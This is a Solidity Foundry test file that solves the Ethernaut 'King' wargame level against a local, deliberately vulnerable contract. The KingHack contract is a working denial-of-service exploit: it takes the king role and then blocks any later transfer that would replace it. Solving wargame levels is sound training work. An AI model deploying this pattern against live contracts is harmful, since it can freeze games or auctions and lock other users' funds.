pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { King } from "src/King/King.sol";
import { KingFactory } from "src/King/KingFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract KingHack {
    address payable king;

    constructor(address _king) {
        king = payable(_king);
    }

    receive() external payable {
        (bool success,) = king.call{value: msg.value}(new bytes(0));
        require(success);
    }
}
contract KingTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");
    
    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testKingHack() external {
        // level setup
        KingFactory factory = new KingFactory();
        ethernaut.registerLevel(factory);

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        King king = King(payable(levelAddress));

        // attack
        assertEq(king.prize(), 1 ether);

        KingHack attacker = new KingHack(address(king));
        address(payable(attacker)).call{value: 1 ether}(new bytes(0));
        assertEq(king._king(), address(attacker));

        
        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}

